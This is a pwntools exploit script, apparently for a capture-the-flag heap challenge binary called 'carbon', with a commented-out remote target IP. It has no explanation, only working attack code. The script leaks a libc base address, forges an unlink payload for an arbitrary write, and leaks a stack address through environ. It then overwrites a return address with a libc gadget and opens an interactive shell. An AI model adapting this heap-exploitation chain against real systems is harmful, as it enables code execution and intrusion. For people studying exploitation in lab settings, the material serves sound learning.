from pwn import *

#p = remote('119.3.158.103',19008)
p = process('./carbon')
context.log_level = 'debug'
elf = ELF('./carbon')
libc = ELF('libc.so')

s = lambda x,y: p.sendafter(x,y)
sl = lambda x,y : p.sendlineafter(x,y)

def add(sz,cnt,bel='N'):
    sl('> ',str(1))
    sl('>',str(sz))
    sl('>',bel)
    s('>',cnt)

def dele(idx):
    sl('> ',str(2))
    sl('>',str(idx))

def edit(idx,cnt):
    sl('> ',str(3))
    sl('>',str(idx))
    p.send(cnt)

def show(idx):
    sl('> ',str(4))
    sl('>',str(idx))

add(0x68,'0'*0x68)
add(0x68,'1'*0x68)
add(0x68,'2'*0x68)
add(0x68,'3'*0x68)
add(0x68,'4'*0x68)
dele(0)
add(0x8,'0'*0x8)
show(0)
p.recvuntil('0'*8)
data = u64(p.recv(6).ljust(8,'\x00'))
libc_base = data - 2697992
print 'libc_base :'+hex(libc_base)
mmap_addr = libc_base + 0x290000
environ = libc_base + 0x294fd8

dele(2)

#unlink
payload = p64(0x91)+p64(0x70)
payload += p64(mmap_addr+0x28-0x18)+p64(mmap_addr+0x28-0x10)
payload += '\x00'*0x50
payload += p64(0x70)+p64(0x81)
add(0x68,payload+'\n','Y')
dele(3)

edit(2,p32(0x602034)+'\x00\x00\x00\n')
edit(1,p32(0x0)+'\n')

edit(2,p64(environ)[0:6]+'\n')
show(1)
stack_addr = u64(p.recv(6).ljust(8,'\x00'))
print 'stak addr :'+hex(stack_addr)

edit(2,p64(stack_addr-0x70)[0:6]+'\n')
edit(1,p64(libc_base+0x390D1)[0:6]+'\n')
#gdb.attach(p,'b *0x400F45')

p.interactive()
